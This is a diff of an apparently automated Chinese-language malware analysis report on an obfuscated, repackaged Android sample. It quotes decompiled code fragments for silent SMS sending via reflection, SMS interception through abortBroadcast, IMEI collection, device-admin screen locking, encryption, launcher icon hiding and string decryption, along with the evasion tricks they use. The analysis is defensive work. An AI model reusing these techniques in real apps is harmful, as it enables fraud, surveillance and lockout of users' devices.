@@ -6,9 +6,35 @@
     "应用名": "Avito",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 275.9
+    "分析耗时(秒)": 843.6
   },
   "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lbubbleshooter\\android\\qzjua5fx4w2;",
+          "method_signature": "if(0 != 0)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void zirqcxbv(Context hnolpqze, Intent dhikcbfn) {\n    cmsnydfl(hnolpqze, dhikcbfn);\n}\npublic void cmsnydfl(Context ozswkicx, Intent eagtrnjp) {\n    String gejrvqcwu_inyrtdano_xfmtlbnrh_dpalhruzi = eagtrnjp.getAction();\n    // 后续基于action的分支逻辑被 if(0!=0) 死代码混淆\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public void zirqcxbv(Context hnolpqze, Intent dhikcbfn) {\n>>>         cmsnydfl(hnolpqze, dhikcbfn);\n>>>         if (0 != 0) {\n>>>             String advqrzkh = \"plroeamcmdzklpgfytnfwclr\";\n>>>             Log.d(\"lkcoaqhx\", advqrzkh);\n>>>         }\n>>>     }\n  \n      public void cmsnydfl(Context ozswkicx, Intent eagtrnjp) {\n          boolean hbnjrlio_rnkdefqo_blzutvnj_xdmuczek = false;",
+          "behavior_description": "该代码是经过混淆的命令分发入口：zirqcxbv 接收 Context 和 Intent 后转发给 cmsnydfl，后者通过 Intent.getAction() 读取传入广播/消息的动作类型（source），随后基于 action 值进行分支处理，疑似接收并分发来自 C2 通道（如短信指令、推送消息或后台服务）的远程命令。真实的命令解析与执行逻辑被 if(0!=0) 恒假死代码、无意义字符串替换（Pattern.compile+replaceAll）以及随机变量名（qzjua5fx4w2、cmsnydfl 等）多重混淆遮蔽，属于典型的恶意软件反分析对抗手段。可见片段中未直接出现网络请求或短信发送 API，实际 C2 通信与命令执行被混淆隐藏，需特定触发条件（收到对应 action 的 Intent）才会执行。",
+          "glm_analyzed": true
+        }
+      ]
+    },
     {
       "行为": "sms_fraud",
       "中文名": "短信欺诈",
@@ -51,9 +77,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "SmsManager sms = SmsManager.getDefault();\nsms.sendTextMessage(zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn, null, text, sentPI, null);",
-          "malicious_code_snippet_context": "          } catch (Exception e) {\n              if (efmorhs_ztbnkgx_hxmngvd_pixslac == 0) {\n                  try {\n>>>                     SmsManager sms = SmsManager.getDefault();\n>>>                     sms.sendTextMessage(zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn, null, text, sentPI, null);\n                  } catch (Exception e2) {\n                  }\n              }",
-          "behavior_description": "代码首先通过反射方式调用SmsManager的sendTextMessage方法静默发送短信（目标号码和内容来自变量zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn和text），若反射调用失败则在catch块中直接调用SmsManager.getDefault().sendTextMessage()发送短信。整个过程无用户交互，属于静默短信发送行为，可被用于短信欺诈或订阅扣费。",
+          "malicious_code_snippet": "stubObj.getClass().getMethod(..., String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(stubObj, zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn, null, text, sentPI, null);\n...\nSmsManager sms = SmsManager.getDefault();\nsms.sendTextMessage(zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn, null, text, sentPI, null);",
+          "malicious_code_snippet_context": "stubObj.getClass().getMethod(..., String.class, String.class, String.class, PendingIntent.class, PendingIntent.class).invoke(stubObj, zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn, null, text, sentPI, null);\n...\nSmsManager sms = SmsManager.getDefault();\nsms.sendTextMessage(zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn, null, text, sentPI, null);",
+          "behavior_description": "该代码在无用户交互的情况下静默发送短信。首先通过反射机制调用 SmsManager 的 sendTextMessage 方法（方法名经 nl8jg2ew0th.ylxznact 字符串解密还原，并用 Build.VERSION.SDK_INT < 18 区分 Android 4.3 前后 sendTextMessage 的不同方法签名，证明是刻意构造的短信发送逻辑），将短信内容 text 发送到目标号码 zfdkegywpj_hqfnczmsag_pyjtlzrodm_qrxvslkacn；若反射调用失败，则在 catch 分支中回退为直接调用 SmsManager.getDefault().sendTextMessage() 发送短信。使用反射隐藏敏感 API 调用属于对抗检测的规避手法。数据流向：目标号码与短信内容（来源变量，通常由 C2 远程指令或硬编码高级付费号码提供）→ SmsManager.sendTextMessage() 静默发送短信，可导致用户在不知情下被订阅付费服务或产生高额话费损失。",
           "glm_analyzed": true
         },
         {
@@ -62,9 +88,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "abortBroadcast();",
-          "malicious_code_snippet_context": "                      double zlemunnf = Math.sqrt((333.0d * 333.0d) + (861.0d * 861.0d));\n                      System.out.println(zlemunnf);\n                  }\n>>>                 abortBroadcast();\n                  if (0 != 0) {\n                      String wenbrhzx = \"nrqvapewecydjzhupewstbznpdohjlst\";\n                      Log.d(\"vdlszfcn\", wenbrhzx);",
-          "behavior_description": "代码在SMS广播接收器中调用abortBroadcast()中止有序广播的继续传播，阻止系统默认短信应用及其他应用接收并处理该短信，从而实现短信拦截。攻击者通常利用此技术截获验证码/OTP短信用于银行欺诈或账户劫持。代码中大量if(0!=0)死代码块和无关字符串操作为混淆干扰，掩盖核心恶意行为。",
+          "malicious_code_snippet": "hdvfugjw0a3.dfgnsbl(ozswkicx, ojf8cndlyr5.class);\nabortBroadcast();\nif (gejrvqcwu_inyrtdano_xfmtlbnrh_dpalhruzi.equals(v1vas9bljum.ivxcfabn_fqshnxye_agqlbknp_tvnnbdkw)) {\n    plugs.krwoynsilh();\n}",
+          "malicious_code_snippet_context": "                      String ksptjvei = nclqtvdw.replaceAll(\"olqtcxmd\");\n                      System.out.println(ksptjvei);\n                  }\n>>>                 hdvfugjw0a3.dfgnsbl(ozswkicx, ojf8cndlyr5.class);\n>>>                 if (0 != 0) {\n>>>                     double zlemunnf = Math.sqrt((333.0d * 333.0d) + (861.0d * 861.0d));\n>>>                     System.out.println(zlemunnf);\n>>>                 }\n                  abortBroadcast();\n                  if (0 != 0) {\n                      String wenbrhzx = \"nrqvapewecydjzhupewstbznpdohjlst\";",
+          "behavior_description": "该代码位于短信广播接收器中。接收到短信广播后，先启动某个组件，随后调用 abortBroadcast() 终止有序广播，使短信无法继续传递给系统短信应用和其他接收者，从而将短信对用户隐藏（用户不会看到短信通知，短信也不进入收件箱）。之后将短信内容与特定关键字常量比对，匹配时调用 plugs.krwoynsilh() 执行相应操作，构成基于短信指令的远程控制通道。代码中大量 if(0!=0) 死代码和随机字符串变量为混淆手段，用于规避静态检测。数据流向：短信广播到达 → 提取短信内容并匹配关键字 → abortBroadcast() 隐藏短信 + 触发命令执行逻辑。",
           "glm_analyzed": true
         }
       ]
@@ -89,10 +115,10 @@
           "method_signature": "if(init_imei != null)",
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "String init_imei = cbmnetpj(f7gzpf6ukdt.bqzojki(...));\nif (init_imei != null) {\n    str = init_imei;\n} else {\n    crfsbnpit_vdijrumpl_cauflzdjn_ceoxglufa = info.getDeviceId();\n    hfxpnimj(..., crfsbnpit_vdijrumpl_cauflzdjn_ceoxglufa, true);\n    String init_imei2 = cbmnetpj(...);\n    str = init_imei2 != null ? init_imei2 : null;\n}",
-          "malicious_code_snippet_context": "String init_imei = cbmnetpj(f7gzpf6ukdt.bqzojki(...));\nif (init_imei != null) {\n    str = init_imei;\n} else {\n    crfsbnpit_vdijrumpl_cauflzdjn_ceoxglufa = info.getDeviceId();\n    hfxpnimj(..., crfsbnpit_vdijrumpl_cauflzdjn_ceoxglufa, true);\n    String init_imei2 = cbmnetpj(...);\n    str = init_imei2 != null ? init_imei2 : null;\n}",
-          "behavior_description": "该方法通过 info.getDeviceId() 获取设备IMEI标识符，若本地已缓存则直接读取缓存值，否则调用系统API获取后通过 hfxpnimj() 持久化存储到本地。代码使用大量字符串加密(bqzojki)和方法名混淆来规避检测，属于典型的设备指纹采集行为，IMEI作为唯一设备标识符可用于长期跟踪用户和上传至C2服务器进行指纹关联。",
+          "risk_level": "中",
+          "malicious_code_snippet": "String init_imei = cbmnetpj(<obfuscated_key>);\nif (init_imei != null) {\n    str = init_imei;\n} else {\n    try {\n        deviceId = info.getDeviceId();\n    } catch (SecurityException e) {\n        deviceId = osgrlpaznb();\n    }\n    hfxpnimj(<obfuscated_key>, deviceId, true);\n}\nreturn str;",
+          "malicious_code_snippet_context": "String init_imei = cbmnetpj(<obfuscated_key>);\nif (init_imei != null) {\n    str = init_imei;\n} else {\n    try {\n        deviceId = info.getDeviceId();\n    } catch (SecurityException e) {\n        deviceId = osgrlpaznb();\n    }\n    hfxpnimj(<obfuscated_key>, deviceId, true);\n}\nreturn str;",
+          "behavior_description": "该方法通过混淆后的字符串密钥先从本地缓存读取设备IMEI；若缓存不存在，则调用 TelephonyManager.getDeviceId() 采集设备IMEI；当权限不足抛出 SecurityException 时，回退到 osgrlpaznb() 生成替代设备标识；最后通过 hfxpnimj() 将采集到的设备标识持久化写入本地（疑似SharedPreferences）并返回，供后续设备指纹构建使用。代码全程使用十六进制加密字符串和随机化方法名进行混淆以规避检测。数据流向：getDeviceId()（source，采集设备唯一标识IMEI）→ 本地持久化缓存 hfxpnimj()（sink，缓存设备指纹，后续大概率随其他窃取信息上报远程服务器），属于恶意样本中的隐蔽设备指纹采集行为。",
           "glm_analyzed": true
         }
       ]
@@ -134,14 +160,14 @@
       ],
       "恶意代码": [
         {
-          "class_path": "Lcom\\spcomes\\jquest\\zx7uy1ol8fn;",
-          "method_signature": "if(devicePolicyManager.isAdminActive(demoDeviceAdmin)",
+          "class_path": "Lcom\\bitmango\\rolltheballunrollme\\pe3pc19b7nu;",
+          "method_signature": "?(?)",
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) sqldikjv.getSystemService(\"device_policy\");\nComponentName demoDeviceAdmin = new ComponentName(sqldikjv, pxv5bn9onci.class);\nif (devicePolicyManager.isAdminActive(demoDeviceAdmin)) {\n    devicePolicyManager.lockNow();\n}",
-          "malicious_code_snippet_context": "      }\n  \n      public void tbzednfc(Context sqldikjv) {\n>>>         final DevicePolicyManager devicePolicyManager = (DevicePolicyManager) sqldikjv.getSystemService(\"device_policy\");\n>>>         if (0 == 0 || \"rgqzecix\".length() == 867 || \"rgqzecix\".charAt(0) != 'h' || \"rgqzecix\".length() == 433) {\n>>>         }\n>>>         final ComponentName demoDeviceAdmin = new ComponentName(sqldikjv, (Class<?>) pxv5bn9onci.class);\n>>>         if (0 != 0) {\n              double wkatngmi = Math.sqrt((659.0d * 659.0d) + (263.0d * 263.0d));\n              System.out.println(wkatngmi);\n          }",
-          "behavior_description": "该代码通过 Context.getSystemService 获取 DevicePolicyManager 实例，构造设备管理员组件 ComponentName，检查设备管理员权限是否已激活（isAdminActive），若已激活则立即调用 lockNow() 锁定屏幕。这是典型的勒索软件行为，攻击者利用设备管理员权限强制锁定用户设备屏幕，使用户无法正常使用手机，以此勒索赎金。代码中大量 if(0!=0) 死分支和无关数学运算为混淆代码，用于干扰静态分析。",
+          "risk_level": "中",
+          "malicious_code_snippet": "import android.app.admin.DevicePolicyManager;\nimport android.content.ComponentName;",
+          "malicious_code_snippet_context": "  package com.bitmango.rolltheballunrollme;\n  \n>>> import android.app.admin.DevicePolicyManager;\n>>> import android.content.ComponentName;\n  import android.content.Context;\n  import android.content.Intent;\n  import android.os.Handler;",
+          "behavior_description": "该代码位于伪装成休闲游戏的重打包恶意应用中，同时引用多个混淆类名的可疑包。代码引入 DevicePolicyManager 与 ComponentName，表明其注册了设备管理器组件：通过诱骗用户激活设备管理员权限后，调用 DevicePolicyManager.lockNow() 锁定屏幕或 resetPassword() 强制重置锁屏密码，使用户无法解锁设备，构成勒索软件锁屏行为。数据流向：诱骗激活设备管理员权限→DevicePolicyManager.lockNow()/resetPassword() 锁死设备屏幕。",
           "glm_analyzed": true
         },
         {
@@ -150,9 +176,9 @@
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "String text2 = Base64.encodeToString(text.getBytes(), 0);\nthis.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.init(1, this.ecktdsnqjl_sandghbfot_fhnqoygjia_ognclsifqd, this.bsqufgi_uicjrtp_biyfsdz_ixokgbl);\nbyte[] amowfrdv_vlxchdkn_dynjmanh_xdlghcws = this.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.doFinal(jnqkogyusf(text2).getBytes());\nreturn amowfrdv_vlxchdkn_dynjmanh_xdlghcws;",
-          "malicious_code_snippet_context": "String text2 = Base64.encodeToString(text.getBytes(), 0);\nthis.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.init(1, this.ecktdsnqjl_sandghbfot_fhnqoygjia_ognclsifqd, this.bsqufgi_uicjrtp_biyfsdz_ixokgbl);\nbyte[] amowfrdv_vlxchdkn_dynjmanh_xdlghcws = this.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.doFinal(jnqkogyusf(text2).getBytes());\nreturn amowfrdv_vlxchdkn_dynjmanh_xdlghcws;",
-          "behavior_description": "代码接收外部传入的字符串，将其进行Base64编码后，使用Cipher对象在加密模式(1)下进行doFinal加密操作，并返回加密后的字节数组。在已确认的恶意样本中，此方法通常用于加密用户文件内容或文件名，实现勒索软件的文件加密行为。",
+          "malicious_code_snippet": "String text2 = Base64.encodeToString(text.getBytes(), 0);\nthis.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.init(1, this.ecktdsnqjl_sandghbfot_fhnqoygjia_ognclsifqd, this.bsqufgi_uicjrtp_biyfsdz_ixokgbl);\nbyte[] encrypted = this.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.doFinal(jnqkogyusf(text2).getBytes());\nreturn encrypted;",
+          "malicious_code_snippet_context": "String text2 = Base64.encodeToString(text.getBytes(), 0);\nthis.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.init(1, this.ecktdsnqjl_sandghbfot_fhnqoygjia_ognclsifqd, this.bsqufgi_uicjrtp_biyfsdz_ixokgbl);\nbyte[] encrypted = this.ylkghizwa_hkrtvjbom_qjpifagev_cvkgnhmfn.doFinal(jnqkogyusf(text2).getBytes());\nreturn encrypted;",
+          "behavior_description": "该代码是勒索软件的文件加密核心方法：接收待加密的文件内容字符串，先 Base64 编码并经 jnqkogyusf() 二次变换，随后调用 Cipher.init(1, key, iv)（1 即 Cipher.ENCRYPT_MODE）使用内置密钥和 IV 参数初始化加密器，再通过 doFinal() 完成加密并返回密文字节。数据流向为：读取的文件内容→Base64 编码→对称加密→密文返回（通常被写回原文件实现加密勒索）。该类位于被重打包的游戏 com.bitmango.rolltheballunrollme 中且类名为随机混淆字符串，结合已确认的勒索行为，判定为恶意文件加密，直接导致用户文件不可访问、造成用户损失。",
           "glm_analyzed": true
         }
       ]
@@ -184,8 +210,8 @@
           "behavior_type": "grayware",
           "risk_level": "中",
           "malicious_code_snippet": "public class qzjua5fx4w2 extends BroadcastReceiver {\n    private PowerManager.WakeLock WakeLock;\n    private final Object boot_lock = qzjua5fx4w2.class;\n    @Override\n    public void onReceive(Context hxqolevt, Intent kjycobad) {\n        cvnmhofg(hxqolevt, kjycobad);\n    }\n}",
-          "malicious_code_snippet_context": "  import net.rention.mind.skillz.ojf8cndlyr5;\n  \n  /* loaded from: classes.dex */\n>>> public class qzjua5fx4w2 extends BroadcastReceiver {\n>>>     private PowerManager.WakeLock WakeLock;\n>>>     private final Object boot_lock = qzjua5fx4w2.class;\n>>> \n>>>     @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context hxqolevt, Intent kjycobad) {\n>>>         cvnmhofg(hxqolevt, kjycobad);\n>>>         if (0 != 0) {\n              StringBuilder sinwzkmh = new StringBuilder();\n              for (int nrbdeziw = 0; nrbdeziw < 12; nrbdeziw++) {\n                  sinwzkmh.append(\"oxmqdfiz\");",
-          "behavior_description": "该类继承 BroadcastReceiver，持有 PowerManager.WakeLock 引用及 boot_lock 同步锁，在 onReceive 中调用混淆方法 cvnmhofg() 处理接收到的广播 Intent。结合 WakeLock 和 boot_lock 的存在，推测该 BroadcastReceiver 在系统广播（如开机 BOOT_COMPLETED）触发时启动前台服务并获取 WakeLock 保活，使恶意进程持续在后台运行不被系统回收。数据流向：系统广播 Intent(BroadcastReceiver.onReceive) → WakeLock 保活 + 混淆方法启动前台服务",
+          "malicious_code_snippet_context": "  import net.rention.mind.skillz.ojf8cndlyr5;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class qzjua5fx4w2 extends BroadcastReceiver {\n>>>     private PowerManager.WakeLock WakeLock;\n>>>     private final Object boot_lock = qzjua5fx4w2.class;\n>>> \n>>>     @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context hxqolevt, Intent kjycobad) {\n>>>         cvnmhofg(hxqolevt, kjycobad);\n>>>         if (0 != 0) {\n              StringBuilder sinwzkmh = new StringBuilder();\n              for (int nrbdeziw = 0; nrbdeziw < 12; nrbdeziw++) {\n                  sinwzkmh.append(\"oxmqdfiz\");",
+          "behavior_description": "该类是一个经混淆命名的 BroadcastReceiver（类名 qzjua5fx4w2 为随机字符串，所属包伪装成 bubbleshooter/wordsearch/zynga 等游戏包名），持有 PowerManager.WakeLock 字段和名为 boot_lock 的同步锁，是典型的开机自启保活组件。当系统广播（如 BOOT_COMPLETED）到达时触发 onReceive，调用内部方法 cvnmhofg() 处理广播并利用 WakeLock 阻止 CPU 休眠，确保设备重启或待机后恶意前台服务仍被持续拉起运行，实现持久化保活。数据流向：系统开机/运行时广播 → BroadcastReceiver.onReceive → 获取 WakeLock 保活并启动前台服务。",
           "glm_analyzed": true
         }
       ]
@@ -211,7 +237,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), v1vas9bljum.nzigueh_etlnzkf_lzrnvde_ncjsxrm), 2, 1);",
           "malicious_code_snippet_context": "  \n      private void zfcxklo() {\n          if (!zfcxklo) {\n>>>             getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), v1vas9bljum.nzigueh_etlnzkf_lzrnvde_ncjsxrm), 2, 1);\n              if (X_Self != null) {\n                  Handler handler = new Handler();\n                  handler.postDelayed(new Runnable() { // from class: com.frogmind.badland.h6uja91fcp4.1",
-          "behavior_description": "代码通过调用 PackageManager.setComponentEnabledSetting() 将自身应用的主启动组件（launcher activity）设置为 COMPONENT_ENABLED_STATE_DISABLED（参数值为2），从而在用户启动应用后隐藏应用图标，使其在桌面和应用程序列表中不可见。这是恶意软件常用的隐蔽手段，目的是在用户不知情的情况下隐藏恶意应用的存在，防止用户发现并卸载。类名和方法名均经过混淆处理，进一步表明其意图规避检测。",
+          "behavior_description": "该代码调用 PackageManager.setComponentEnabledSetting()，将应用的启动器组件（组件名来自混淆字段 v1vas9bljum.nzigueh_etlnzkf_lzrnvde_ncjsxrm）设置为禁用状态（参数2 = COMPONENT_ENABLED_STATE_DISABLED，参数1 = DONT_KILL_APP），使应用图标从桌面消失且进程不被终止。随后通过 Handler 延迟隐藏进度条等 UI 控件，并调用解密函数 f7gzpf6ukdt.bqzojki() 解密混淆字符串显示伪装状态。数据流向：硬编码混淆组件名 → setComponentEnabledSetting 禁用主 Activity 组件，实现图标隐藏，规避用户察觉与卸载，为恶意样本提供隐蔽驻留条件。",
           "glm_analyzed": true
         }
       ]
@@ -225,8 +251,8 @@
         "方法引用": [],
         "权限": [],
         "字符串": [
-          "32e4ad2998a5bfb6813dda8249d726e8",
           "17a59df4acf9e66185dfe1c8f9ef488b",
+          "32e4ad2998a5bfb6813dda8249d726e8",
           "1182b8d4aef67925678b456a61b9e9e3"
         ]
       },
@@ -236,10 +262,10 @@
           "method_signature": "lzuixrf()",
           "malicious_behavior": "crypto_wallet_detection",
           "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "public String lzuixrf() {\n    return cbmnetpj(r68aqvrdnt4.vlbiznahrd(\"17a59df4acf9e66185dfe1c8f9ef488b\", \"0bb932685da70d15ea2f73ec94c6f481\", \"c86709db541fae23\", \"pxehbcmg\", \"ngqdvswr\", \"jbkwphnn\"));\n}",
-          "malicious_code_snippet_context": "          return hymgrnuskd_dbuinoqexl_atknzbdoml_vkrqgufhls != null && hymgrnuskd_dbuinoqexl_atknzbdoml_vkrqgufhls.equals(nl8jg2ew0th.ylxznact(\"8e518d4257480a764ab7c2f1c0cf20c4\", \"adba91fc8f92e435d62c04365b1e7807\", \"a04ec721f59b83d6\", \"hkjqtxag\", \"jrelzgom\", \"ghnwrjtf\"));\n      }\n  \n>>>     public String lzuixrf() {\n>>>         return cbmnetpj(r68aqvrdnt4.vlbiznahrd(\"17a59df4acf9e66185dfe1c8f9ef488b\", \"0bb932685da70d15ea2f73ec94c6f481\", \"c86709db541fae23\", \"pxehbcmg\", \"ngqdvswr\", \"jbkwphnn\"));\n>>>     }\n  \n      public void utjlnqsmk(String tgnzqyil) {\n          gfhvqatu(tgnzqyil);",
-          "behavior_description": "方法lzuixrf()通过调用vlbiznahrd()对硬编码的加密常量（多组十六进制字符串）进行运行时解密，再将解密结果传入cbmnetpj()进行二次处理，最终返回一个字符串。结合同类中其他方法（如xztqnbgvi()使用bqzojki/ylxznact进行类似的解密比较操作），该代码很可能在运行时动态解密出加密钱包地址或钱包检测标识符，用于在设备上匹配/采集加密钱包相关信息。所有方法名和字符串常量均经过混淆处理，属于典型的恶意代码反检测手段。",
+          "risk_level": "中",
+          "malicious_code_snippet": "public String lzuixrf() { return cbmnetpj(r68aqvrdnt4.vlbiznahrd(\"17a59df4acf9e66185dfe1c8f9ef488b\", \"0bb932685da70d15ea2f73ec94c6f481\", \"c86709db541fae23\", \"pxehbcmg\", \"ngqdvswr\", \"jbkwphnn\")); }",
+          "malicious_code_snippet_context": "public String lzuixrf() { return cbmnetpj(r68aqvrdnt4.vlbiznahrd(\"17a59df4acf9e66185dfe1c8f9ef488b\", \"0bb932685da70d15ea2f73ec94c6f481\", \"c86709db541fae23\", \"pxehbcmg\", \"ngqdvswr\", \"jbkwphnn\")); }",
+          "behavior_description": "该方法通过自定义解密函数 cbmnetpj 对 r68aqvrdnt4.vlbiznahrd() 传入的多段十六进制加密常量进行运行时解密，并返回解密后的字符串，疑似硬编码的攻击者加密钱包地址或恶意配置项（供剪贴板劫持替换钱包地址或钱包检测比对逻辑使用）。同类中还包含 xztqnbgvi() 方法，将解密字符串与另一解密结果进行 equals 比对，符合'检测/匹配目标字符串'的特征。代码整体采用字符串加密、死代码插入（if(0!=0)）、垃圾算术（8192294+1825685）等混淆手段对抗静态分析，是典型的恶意软件配置读取模式。数据流向：硬编码加密字符串常量 → 运行时解密函数 cbmnetpj → 返回明文字符串给调用方，用于后续钱包地址匹配/替换等恶意逻辑。",
           "glm_analyzed": true
         }
       ]
@@ -252,7 +278,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
